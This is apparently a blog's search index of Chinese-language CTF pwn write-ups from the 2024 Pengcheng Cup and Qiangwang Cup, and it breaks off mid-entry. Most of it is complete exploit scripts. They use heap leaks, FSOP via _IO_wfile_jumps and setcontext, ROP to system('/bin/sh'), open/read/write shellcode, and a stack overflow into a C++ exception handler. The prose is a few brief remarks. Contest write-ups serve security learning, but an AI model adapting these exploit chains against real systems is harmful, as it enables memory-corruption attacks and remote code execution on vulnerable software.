<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>鹏城杯2024</title>
    <link href="/2024/11/09/%E9%B9%8F%E5%9F%8E%E6%9D%AF2024/"/>
    <url>/2024/11/09/%E9%B9%8F%E5%9F%8E%E6%9D%AF2024/</url>
    
    <content type="html"><![CDATA[<h1 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h1><h2 id="babyheap-pcb2024"><a href="#babyheap-pcb2024" class="headerlink" title="babyheap-pcb2024"></a>babyheap-pcb2024</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python3</span><br><span class="hljs-keyword">from</span> pwncli <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> ctypes <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> struct <span class="hljs-keyword">import</span> *<br><br>cli_script() <span class="hljs-comment"># 使用脚本模式必须显式调用这个函数</span><br><br><span class="hljs-comment"># 你能够从gift里面取到很多东西</span><br>io  = gift[<span class="hljs-string">&quot;io&quot;</span>] <span class="hljs-comment"># io对象，pwn.process或者pwn.remote</span><br>elf  = gift[<span class="hljs-string">&quot;elf&quot;</span>] <span class="hljs-comment"># ELF对象，ELF(&quot;./pwn&quot;)</span><br>libc = gift.libc <span class="hljs-comment"># ELF对象， ELF(&quot;./libc.so.6&quot;)</span><br>filename  = gift.filename <span class="hljs-comment"># current filename</span><br>is_debug  = gift.debug <span class="hljs-comment"># is debug or not </span><br>is_remote = gift.remote <span class="hljs-comment"># is remote or not</span><br>gdb_pid   = gift.gdb_pid <span class="hljs-comment"># gdb pid if debug</span><br><br><br><br>arch=<span class="hljs-string">&#x27;amd64&#x27;</span><br>context(log_level = <span class="hljs-string">&#x27;debug&#x27;</span>,os=<span class="hljs-string">&#x27;linux&#x27;</span>,arch=arch)<br><span class="hljs-keyword">if</span> gift.remote:<br>    <span class="hljs-comment">#libc = ELF(&quot;./libc.so.6&quot;)</span><br>    <span class="hljs-comment">#gift[&#x27;libc&#x27;] = libc</span><br>    <span class="hljs-comment"># 有时候远程提供的libc与本地不一样，打靶机时替换libc为远程libc</span><br>    <span class="hljs-keyword">pass</span><br>libc_box = LibcBox() <span class="hljs-comment"># LibcBox对象</span><br><br>r_l = cdll.LoadLibrary(<span class="hljs-string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)<br>r_l.srand(<span class="hljs-number">1</span>)<br><span class="hljs-comment"># - - - - - - - - - - - - - #</span><br>onegadget = [<span class="hljs-number">0xebc81</span>,<span class="hljs-number">0xebc85</span> ,<span class="hljs-number">0xebc88</span>,<span class="hljs-number">0xebce2</span> ,<span class="hljs-number">0xebd38</span>,<span class="hljs-number">0xebd3f</span>,<span class="hljs-number">0xebd43</span>]<br><span class="hljs-comment"># - - - - - - - - - - - - - #</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">cmd</span>(<span class="hljs-params">c</span>):<br>    sla(<span class="hljs-string">&quot;inputs your choice:&quot;</span>,<span class="hljs-built_in">str</span>(c))<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">idx,size,data=<span class="hljs-string">b&#x27;AAAA&#x27;</span></span>):<br>    cmd(<span class="hljs-number">1</span>)<br>    sla(<span class="hljs-string">&quot;input idx:&quot;</span>,<span class="hljs-built_in">str</span>(idx))<br>    sla(<span class="hljs-string">&quot;input size:&quot;</span>,<span class="hljs-built_in">str</span>(size))<br>    sa(<span class="hljs-string">&quot;input content:&quot;</span>,data)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">free</span>(<span class="hljs-params">idx</span>):<br>    cmd(<span class="hljs-number">2</span>)<br>    sla(<span class="hljs-string">&quot;input idx:&quot;</span>,<span class="hljs-built_in">str</span>(idx))<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">idx</span>):<br>    cmd(<span class="hljs-number">3</span>)<br>    sla(<span class="hljs-string">&quot;input idx:&quot;</span>,<span class="hljs-built_in">str</span>(idx))<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">idx,data</span>):<br>    cmd(<span class="hljs-number">4</span>)<br>    sla(<span class="hljs-string">&quot;input idx:&quot;</span>,<span class="hljs-built_in">str</span>(idx))<br>    s(data)<br><span class="hljs-comment"># - - - - - - - - - - - - - #</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">pwn_exp</span>():<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">9</span>):<br>        add(i,<span class="hljs-number">0x400</span>)<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):<br>        free(i)<br>    free(<span class="hljs-number">7</span>)<br>    add(<span class="hljs-number">9</span>,<span class="hljs-number">0x40</span>,<span class="hljs-string">b&#x27;A&#x27;</span>*<span class="hljs-number">0x11</span>)<br>    show(<span class="hljs-number">9</span>)<br>    ru(<span class="hljs-string">b&#x27;A&#x27;</span>*<span class="hljs-number">0x10</span>)<br>    heap_base = u64_ex(io.recv(<span class="hljs-number">6</span>))-<span class="hljs-number">0x41</span><br>    add(<span class="hljs-number">10</span>,<span class="hljs-number">0x40</span>,<span class="hljs-string">b&#x27;A&#x27;</span>*<span class="hljs-number">0x8</span>)<br>    show(<span class="hljs-number">10</span>)<br>    ru(<span class="hljs-string">b&#x27;A&#x27;</span>*<span class="hljs-number">0x8</span>)<br>    libc.address = u64_ex(io.recv(<span class="hljs-number">6</span>)) - <span class="hljs-number">0x000078c237c1ace0</span> + <span class="hljs-number">0x78c237a00000</span><br>    CG.set_find_area(find_in_elf=<span class="hljs-literal">False</span>,find_in_libc=<span class="hljs-literal">True</span>)<br>    p = p64_ex(CG.pop_rdi_ret())+p64_ex(CG.bin_sh())+p64_ex(libc.sym.system)<br>    add(<span class="hljs-number">11</span>,<span class="hljs-number">0x400</span>,p)<br>    fake_addr = libc.sym._IO_2_1_stderr_<br>    pay = <span class="hljs-string">b&#x27;&#x27;</span><br>    io_ = IO_FILE_plus_struct()<br>    io_.flags = <span class="hljs-number">0</span><br>    io_.vtable = libc.sym._IO_wfile_jumps<br>    io_._IO_write_base = fake_addr<br>    io_._IO_write_ptr = fake_addr + <span class="hljs-number">1</span><br>    io_._wide_data = fake_addr-<span class="hljs-number">0x30</span><br>    io_.chain = libc.sym.setcontext+<span class="hljs-number">61</span><br>    <br>    bbb = <span class="hljs-built_in">bytes</span>(io_)<br>    pay += bbb[:<span class="hljs-number">112</span>]+p64_ex(heap_base-<span class="hljs-number">0x400</span>)+p64_ex(CG.ret())+bbb[<span class="hljs-number">128</span>:<span class="hljs-number">176</span>]+p64_ex(fake_addr)+<span class="hljs-built_in">bytes</span>(io_)[<span class="hljs-number">184</span>:]<br>    edit(-<span class="hljs-number">4</span>,pay)<br>    <span class="hljs-comment"># b * _IO_wdoallocbuf+43</span><br>    cmd(<span class="hljs-number">1</span>)<br>    sl(<span class="hljs-string">&#x27;99&#x27;</span>)<br><br><span class="hljs-comment">#log</span><br>    log.info(<span class="hljs-string">&#x27;#---#---#---#---#&#x27;</span>)<br>    <span class="hljs-comment">#log.success(&#x27;libc.address:&#x27;+hex(libc.address))</span><br>    log.success(<span class="hljs-string">&#x27;elf.address:&#x27;</span>+<span class="hljs-built_in">hex</span>(elf.address))<br>    log.success(<span class="hljs-string">&#x27;heap_bae:&#x27;</span>+<span class="hljs-built_in">hex</span>(heap_base))<br><br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    pwn_exp()<br>    io.interactive()<br></code></pre></td></tr></table></figure><h2 id="cool-book"><a href="#cool-book" class="headerlink" title="cool_book"></a>cool_book</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python3</span><br><span class="hljs-keyword">from</span> pwncli <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> ctypes <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> struct <span class="hljs-keyword">import</span> *<br><br>cli_script() <span class="hljs-comment"># 使用脚本模式必须显式调用这个函数</span><br><br><span class="hljs-comment"># 你能够从gift里面取到很多东西</span><br>io  = gift[<span class="hljs-string">&quot;io&quot;</span>] <span class="hljs-comment"># io对象，pwn.process或者pwn.remote</span><br>elf  = gift[<span class="hljs-string">&quot;elf&quot;</span>] <span class="hljs-comment"># ELF对象，ELF(&quot;./pwn&quot;)</span><br>libc = gift.libc <span class="hljs-comment"># ELF对象， ELF(&quot;./libc.so.6&quot;)</span><br>filename  = gift.filename <span class="hljs-comment"># current filename</span><br>is_debug  = gift.debug <span class="hljs-comment"># is debug or not </span><br>is_remote = gift.remote <span class="hljs-comment"># is remote or not</span><br>gdb_pid   = gift.gdb_pid <span class="hljs-comment"># gdb pid if debug</span><br><br><br><br>arch=<span class="hljs-string">&#x27;amd64&#x27;</span><br>context(log_level = <span class="hljs-string">&#x27;debug&#x27;</span>,os=<span class="hljs-string">&#x27;linux&#x27;</span>,arch=arch)<br><span class="hljs-keyword">if</span> gift.remote:<br>    <span class="hljs-comment">#libc = ELF(&quot;./libc.so.6&quot;)</span><br>    <span class="hljs-comment">#gift[&#x27;libc&#x27;] = libc</span><br>    <span class="hljs-comment"># 有时候远程提供的libc与本地不一样，打靶机时替换libc为远程libc</span><br>    <span class="hljs-keyword">pass</span><br>libc_box = LibcBox() <span class="hljs-comment"># LibcBox对象</span><br><br>r_l = cdll.LoadLibrary(<span class="hljs-string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)<br>r_l.srand(<span class="hljs-number">1</span>)<br><span class="hljs-comment"># - - - - - - - - - - - - - #</span><br><br><span class="hljs-comment"># - - - - - - - - - - - - - #</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">cmd</span>(<span class="hljs-params">c</span>):<br>    sla(<span class="hljs-string">&quot;3.exit&quot;</span>,<span class="hljs-built_in">str</span>(c))<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">idx,data=<span class="hljs-string">b&#x27;AAAA&#x27;</span></span>):<br>    cmd(<span class="hljs-number">1</span>)<br>    sla(<span class="hljs-string">&quot;input idx&quot;</span>,<span class="hljs-built_in">str</span>(idx))<br>    sa(<span class="hljs-string">&quot;input content&quot;</span>,data)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">free</span>(<span class="hljs-params">idx</span>):<br>    cmd(<span class="hljs-number">2</span>)<br>    sla(<span class="hljs-string">&quot;input idx&quot;</span>,<span class="hljs-built_in">str</span>(idx))<br><span class="hljs-comment"># - - - - - - - - - - - - - #</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">pwn_exp</span>():<br>    ru(<span class="hljs-string">&#x27;addr=&#x27;</span>)<br>    heap_base = <span class="hljs-built_in">int</span>(ru(<span class="hljs-string">&#x27;\n&#x27;</span>),<span class="hljs-number">16</span>)<br><br>    rr = asm(<span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">xor rdi,rdi</span><br><span class="hljs-string">mov rsi,&#123;&#125;</span><br><span class="hljs-string">jmp $-61</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span>.<span class="hljs-built_in">format</span>(heap_base))<br>    rrr = asm(<span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">mov edx,esi</span><br><span class="hljs-string">syscall</span><br><span class="hljs-string">call rsi</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span>)<br>    orw = asm(<span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">mov rsp,rbp</span><br><span class="hljs-string">push &#123;&#125;</span><br><span class="hljs-string">mov rdi,rsp</span><br><span class="hljs-string">xor rsi,rsi</span><br><span class="hljs-string">xor rdx,rdx</span><br><span class="hljs-string">mov rax,2</span><br><span class="hljs-string">syscall</span><br><span class="hljs-string">mov edi,3</span><br><span class="hljs-string">mov rsi,rsp</span><br><span class="hljs-string">mov rdx,120</span><br><span class="hljs-string">mov rax,0</span><br><span class="hljs-string">syscall</span><br><span class="hljs-string">mov rdi,1</span><br><span class="hljs-string">mov rsi,rsp</span><br><span class="hljs-string">mov rdx,120</span><br><span class="hljs-string">mov rax,1</span><br><span class="hljs-string">syscall     </span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span>.<span class="hljs-built_in">format</span>(u64_ex(<span class="hljs-string">&#x27;flag&#x27;</span>)))<br>    <br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">48</span>):<br>        add(i)<br><br>    <span class="hljs-built_in">print</span>(<span class="hljs-built_in">len</span>(rrr))<br>    add(<span class="hljs-number">48</span>,rrr)<br>    add(<span class="hljs-number">49</span>,rr)<br>    cmd(<span class="hljs-number">3</span>)<br>    pause()<br>    sl(orw)<br><br><br><span class="hljs-comment">#log</span><br><br>    log.info(<span class="hljs-string">&#x27;#---#---#---#---#&#x27;</span>)<br>    <span class="hljs-comment">#log.success(&#x27;libc.address:&#x27;+hex(libc.address))</span><br>    log.success(<span class="hljs-string">&#x27;elf.address:&#x27;</span>+<span class="hljs-built_in">hex</span>(elf.address))<br>    log.success(<span class="hljs-string">&#x27;heap_bae:&#x27;</span>+<span class="hljs-built_in">hex</span>(heap_base))<br><br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    pwn_exp()<br>    io.interactive()<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>pwn</category>
      
    </categories>
    
    
    <tags>
      
      <tag>pwn</tag>
      
      <tag>鹏城杯</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>强网杯2024</title>
    <link href="/2024/11/03/%E5%BC%BA%E7%BD%91%E6%9D%AF2024/"/>
    <url>/2024/11/03/%E5%BC%BA%E7%BD%91%E6%9D%AF2024/</url>
    
    <content type="html"><![CDATA[<h1 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h1><h2 id="expect-number-复现"><a href="#expect-number-复现" class="headerlink" title="expect_number (复现)"></a>expect_number (复现)</h2><p>做这道题的时候已经快结束了, 没有注意到展示历史记录的地址可以进行对程序基地址的泄露, 残念</p><p><img src="https://pub-808b90b25ac94f99b07662ad753ee98f.r2.dev/2024/11/86e5a31c02fb548d702afcbad004cc0e.png"></p><p><img src="https://pub-808b90b25ac94f99b07662ad753ee98f.r2.dev/2024/11/758d6c3ce5e0dd1a9eeef9e9309f6e23.png"></p><p>我们可以通过对最后 0x5520 处修改一个自己来实现对存在溢出的函数的执行</p><p><img src="https://pub-808b90b25ac94f99b07662ad753ee98f.r2.dev/2024/11/da65c69fba7af893946bb6f55c325a74.png"></p><p>考点是 <code>c++</code> 的异常处理<br>将返回地址覆盖为存在后门的的<code>handler</code>就好了<br>覆盖的 <code>rbp</code> 需要可写</p><p><img src="https://pub-808b90b25ac94f99b07662ad753ee98f.r2.dev/2024/11/72e7a75f474f7ed3b97d5fe41d9d0c0e.png"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python3</span><br><span class="hljs-keyword">from</span> pwncli <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> ctypes <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> time <span class="hljs-keyword">import</span> time<br><span class="hljs-keyword">from</span> struct <span class="hljs-keyword">import</span> *<br><br>cli_script() <span class="hljs-comment"># 使用脚本模式必须显式调用这个函数</span><br><br><span class="hljs-comment"># 你能够从gift里面取到很多东西</span><br>io  = gift[<span class="hljs-string">&quot;io&quot;</span>] <span class="hljs-comment"># io对象，pwn.process或者pwn.remote</span><br>elf  = gift[<span class="hljs-string">&quot;elf&quot;</span>] <span class="hljs-comment"># ELF对象，ELF(&quot;./pwn&quot;)</span><br>libc = gift.libc <span class="hljs-comment"># ELF对象， ELF(&quot;./libc.so.6&quot;)</span><br>filename  = gift.filename <span class="hljs-comment"># current filename</span><br>is_debug  = gift.debug <span class="hljs-comment"># is debug or not </span><br>is_remote = gift.remote <span class="hljs-comment"># is remote or not</span><br>gdb_pid   = gift.gdb_pid <span class="hljs-comment"># gdb pid if debug</span><br><br>arch=<span class="hljs-string">&#x27;amd64&#x27;</span><br>context(log_level = <span class="hljs-string">&#x27;debug&#x27;</span>,os=<span class="hljs-string">&#x27;linux&#x27;</span>,arch=arch)<br><span class="hljs-keyword">if</span> gift.remote:<br>    <span class="hljs-comment">#libc = ELF(&quot;./libc.so.6&quot;)</span><br>    <span class="hljs-comment">#gift[&#x27;libc&#x27;] = libc</span><br>    <span class="hljs-comment"># 有时候远程提供的libc与本地不一样，打靶机时替换libc为远程libc</span><br>    <span class="hljs-keyword">pass</span><br>libc_box = LibcBox() <span class="hljs-comment"># LibcBox对象</span><br><br>r_l = cdll.LoadLibrary(<span class="hljs-string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)<br>r_l.srand(<span class="hljs-number">1</span>)<br><span class="hljs-comment"># - - - - - - - - - - - - - #</span><br>c = [<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">2</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">2</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">2</span>,<span class="hljs-number">2</span>,<span class="hljs-number">2</span>]<br><br>b = <span class="hljs-string">&#x27;/*-/-/*+--*/*//*+*++/+/-***///-***-/-+/*---/+-*+/*-*/++-**+---+/+-*---+/*-*/*+/*/++*++//*/++++/+***//***/--*-+++-+*---+/+-/--/-/-//+--*-*//++/+-//*++/+-+/*-*/-//+++-*-+*++*/+///-/++/-+//*-*/--/-*+//+-++//-**++*++---++/*/*/+-+*-/**-**+-//++/*+//*++*/*---**-+++**-++**+-*++++//*+/-/-*-*+//-&#x27;</span><br><span class="hljs-comment"># - - - - - - - - - - - - - #</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">cmd</span>(<span class="hljs-params">c</span>):<br>    sla(<span class="hljs-string">&quot;waiting for your choice&quot;</span>,<span class="hljs-built_in">str</span>(c))<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">game</span>(<span class="hljs-params">c</span>):<br>    cmd(<span class="hljs-number">1</span>)<br>    sla(<span class="hljs-string">&quot;Which one do you choose? 2 or 1 or 0&quot;</span>,<span class="hljs-built_in">str</span>(c))<br><br><br><span class="hljs-comment"># - - - - - - - - - - - - - #</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">pwn_exp</span>():<br>    num = <span class="hljs-number">0</span><br>    cc = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">while</span> cc &lt; <span class="hljs-number">14</span>:<br>        <span class="hljs-built_in">print</span>(c[cc])<br>        <span class="hljs-keyword">if</span> b[num] == <span class="hljs-string">&#x27;-&#x27;</span>:<br>            game(<span class="hljs-number">0</span>)<br>        <span class="hljs-keyword">elif</span> b[num] == <span class="hljs-string">&#x27;+&#x27;</span>:<br>            game(c[cc])<br>            cc+=<span class="hljs-number">1</span><br>        <span class="hljs-keyword">elif</span> b[num] == <span class="hljs-string">&#x27;*&#x27;</span>:<br>            game(c[cc])<br>            cc+=<span class="hljs-number">1</span><br>        <span class="hljs-keyword">elif</span> b[num] == <span class="hljs-string">&#x27;/&#x27;</span>:<br>            game(<span class="hljs-number">1</span>)<br>        num += <span class="hljs-number">1</span><br>    <span class="hljs-keyword">while</span> num &lt; (<span class="hljs-number">288</span>-<span class="hljs-number">12</span>):<br>        <span class="hljs-keyword">if</span> b[num] == <span class="hljs-string">&#x27;-&#x27;</span>:<br>            game(<span class="hljs-number">0</span>)<br>        <span class="hljs-keyword">elif</span> b[num] == <span class="hljs-string">&#x27;+&#x27;</span>:<br>            game(<span class="hljs-number">0</span>)<br>        <span class="hljs-keyword">elif</span> b[num] == <span class="hljs-string">&#x27;*&#x27;</span>:<br>            game(<span class="hljs-number">1</span>)<br>        <span class="hljs-keyword">elif</span> b[num] == <span class="hljs-string">&#x27;/&#x27;</span>:<br>            game(<span class="hljs-number">1</span>)<br>        num += <span class="hljs-number">1</span><br>    cmd(<span class="hljs-number">2</span>)<br>    ru(<span class="hljs-string">&#x27;110101120021111122001010222111011101001100010010110110001100000100100001101110111001001111000010111111111001000000100001001001010110001011100100111001000110110110000100100110111010010011101100101011000011011001000000011111000101110110011001101110011100011000011000110010000111&#x27;</span>)<br>    elf.address = u64_ex(io.recv(<span class="hljs-number">6</span>))-<span class="hljs-number">0x5e1a8d490c60</span>+<span class="hljs-number">0x5e1a8d48c000</span>  <br>    cmd(<span class="hljs-number">4</span>)<br>    p = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x20</span>+p64(elf.address+<span class="hljs-number">0x5f00</span>)+p64_ex(elf.address+<span class="hljs-number">0x251a</span>)<br>    s(p)<br><span class="hljs-comment">#log</span><br>    <br>    log.info(<span class="hljs-string">&#x27;#---#---#---#---#&#x27;</span>)<br>    <span class="hljs-comment">#log.success(&#x27;libc.address:&#x27;+hex(libc.address))</span><br>    log.success(<span class="hljs-string">&#x27;elf.address:&#x27;</span>+<span class="hljs-built_in">hex</span>(elf.address))<br>    <span class="hljs-comment">#log.success(&#x27;heap_bae:&#x27;+hex(heap_base))</span><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    pwn_exp()<br>    io.interactive()<br></code></pre></td></tr></table></figure><h2 id="baby-heap"><a href="#baby-heap" class="headerlink" title="baby_heap"></a>baby_heap</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span 